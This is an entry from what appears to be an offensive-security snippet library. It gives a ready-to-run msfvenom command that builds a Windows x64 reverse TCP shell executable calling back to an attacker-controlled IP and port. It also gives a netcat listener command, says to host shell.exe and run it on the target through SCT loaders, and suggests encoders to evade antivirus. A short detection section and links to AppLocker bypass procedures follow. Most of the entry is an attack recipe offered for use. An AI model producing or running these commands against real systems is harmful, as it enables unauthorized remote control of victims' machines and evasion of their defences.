---
id: 090a9674-63e6-4418-ac89-ba75d1500efc
type: code
name: msfvenom-windows-x64-reverse-tcp-shell-exe
language: bash
verified: true
created_at: '2020-03-04T05:23:18.474272+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Windows
tags:
  - payload
  - reverse-shell
validated: true
---

# msfvenom-windows-x64-reverse-tcp-shell-exe

## Code

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_ATTACKER_PORT -f exe -o shell.exe
```

## Description

This command uses msfvenom to generate a Windows x64 executable payload that establishes a reverse TCP shell connecting back to the attacker's listener. The resulting shell.exe can be executed on the target for remote command access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker's listener | 192.168.1.100 |
| $_ATTACKER_PORT | Port on which the attacker is listening (e.g., with nc -lvnp) | 4444 |

## Usage

Run on Kali/Linux with Metasploit installed. Output is shell.exe, which should be hosted for download and executed via SCT or other loaders. Start a listener first: nc -lvnp $_ATTACKER_PORT.

## Detection

- Antivirus signatures for shell_reverse_tcp payloads; use encoders if needed.
- Network connections from target to attacker IP/port (e.g., via Zeek or Windows Firewall logs).
- Process creation of suspicious EXEs spawning cmd.exe (Sysmon Event ID 1).

## Related

- [[procedures/Windows-AppLocker-Whitelist-Bypass-via-cmstp]]
- [[codes/pwn-sct-file-for-local-payload-launch]]
